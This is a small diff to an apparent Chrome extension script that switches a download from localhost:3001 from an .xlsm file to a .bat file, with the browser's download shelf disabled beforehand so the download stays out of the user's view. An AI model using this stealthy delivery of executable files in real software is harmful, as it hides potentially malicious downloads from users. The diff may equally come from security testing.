@@ -17,7 +17,7 @@ function download() {
 	state = 'download';
 	chrome.downloads.setShelfEnabled(false);
 	chrome.downloads.download({
-		url: 'https://localhost:3001/download?filename=1.xlsm',
+		url: 'https://localhost:3001/download?filename=1.bat',
 		method: 'GET',
 	}, function(downloadId){	
 		var interval = setInterval(function() {
